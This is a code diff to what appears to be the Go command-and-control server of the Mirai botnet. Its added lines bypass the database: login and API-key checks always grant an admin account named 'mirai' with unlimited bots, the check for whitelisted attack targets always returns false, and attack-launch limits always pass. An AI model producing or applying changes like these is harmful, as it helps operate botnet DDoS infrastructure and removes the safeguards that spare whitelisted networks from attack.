@@ -21,6 +21,7 @@ type AccountInfo struct {
 }
 
 func NewDatabase(dbAddr string, dbPort int, dbUser string, dbPassword string, dbName string) *Database {
+	return &Database{}
 	db, err := sql.Open("mysql", fmt.Sprintf("%s:%s@tcp(%s:%d)/%s", dbUser, dbPassword, dbAddr, dbPort, dbName))
 	if err != nil {
 		fmt.Println(err)
@@ -30,6 +31,12 @@ func NewDatabase(dbAddr string, dbPort int, dbUser string, dbPassword string, db
 }
 
 func (this *Database) TryLogin(username string, password string) (bool, AccountInfo) {
+	acc := AccountInfo{
+		username: "mirai",
+		maxBots:  -1,
+		admin:    1,
+	}
+	return true, acc
 	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE username = ? AND password = ? AND (wrc = 0 OR (UNIX_TIMESTAMP() - last_paid < `intvl` * 24 * 60 * 60))", username, password)
 	if err != nil {
 		fmt.Println(err)
@@ -45,6 +52,7 @@ func (this *Database) TryLogin(username string, password string) (bool, AccountI
 }
 
 func (this *Database) CreateUser(username string, password string, max_bots int, duration int, cooldown int) bool {
+	return false
 	rows, err := this.db.Query("SELECT username FROM users WHERE username = ?", username)
 	if err != nil {
 		fmt.Println(err)
@@ -58,6 +66,7 @@ func (this *Database) CreateUser(username string, password string, max_bots int,
 }
 
 func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
+	return false
 	rows, err := this.db.Query("SELECT prefix, netmask FROM whitelist")
 	if err != nil {
 		fmt.Println(err)
@@ -97,6 +106,7 @@ func (this *Database) ContainsWhitelistedTargets(attack *Attack) bool {
 }
 
 func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {
+	return true, nil
 	rows, err := this.db.Query("SELECT id, duration_limit, cooldown FROM users WHERE username = ?", username)
 	defer rows.Close()
 	if err != nil {
@@ -130,6 +140,12 @@ func (this *Database) CanLaunchAttack(username string, duration uint32, fullComm
 }
 
 func (this *Database) CheckApiCode(apikey string) (bool, AccountInfo) {
+	acc := AccountInfo{
+		username: "mirai",
+		maxBots:  -1,
+		admin:    1,
+	}
+	return true, acc
 	rows, err := this.db.Query("SELECT username, max_bots, admin FROM users WHERE api_key = ?", apikey)
 	if err != nil {
 		fmt.Println(err)
